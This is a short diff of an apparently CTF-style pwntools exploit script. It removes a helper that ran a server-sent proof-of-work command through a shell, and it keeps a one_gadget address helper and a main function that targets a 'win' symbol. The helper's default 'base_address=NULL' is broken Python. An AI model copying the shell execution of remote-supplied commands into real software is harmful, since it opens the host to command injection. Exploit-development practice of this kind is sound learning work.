@@ -42,22 +42,7 @@ def conn():
 
 def get_one_gadget(filename: str, base_address=NULL) -> int:
     return [i + base_address for i in [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]]
-
-def solve_poc(p):
-    p.recvuntil(b"work: ")
-    cmd = p.recvline()
-    proc = log.progress(f"solving POC")
-
-    try:
-        solve = subprocess.check_output(cmd, shell=True, text=True).strip()
-        proc.success("Done")
-    except:
-        proc.failure("Error")
-        exit(-1)
-
-    log.info(f"solve @ {solve}")
-    p.sendline(solve.encode('utf-8'))
-
+    
 def main():
     with conn() as p:
         win = elf.symbols['win']
